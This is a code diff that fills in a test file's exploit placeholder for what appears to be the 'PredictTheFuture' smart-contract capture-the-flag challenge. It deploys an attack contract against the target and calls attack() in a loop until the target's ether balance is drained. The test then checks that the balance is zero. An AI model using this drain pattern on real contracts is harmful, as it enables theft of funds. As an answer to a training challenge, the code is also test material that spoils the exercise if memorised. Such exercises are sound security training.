@@ -24,9 +24,19 @@ describe('PredictTheFutureChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    let malware = await (
+      await ethers.getContractFactory('PredictTheFutureAttack', attacker)
+    ).deploy(target.address, { value: utils.parseEther('1') });
+    await malware.deployed();
+
+    while (await target.isComplete() === false) {
+      try {
+        let tx = await malware.attack();
+        await tx.wait();
+      } catch (e) {}
+      console.log(`block number: ${await provider.getBlockNumber()}`);
+    }
+    
 
     expect(await provider.getBalance(target.address)).to.equal(0);
     expect(await target.isComplete()).to.equal(true);
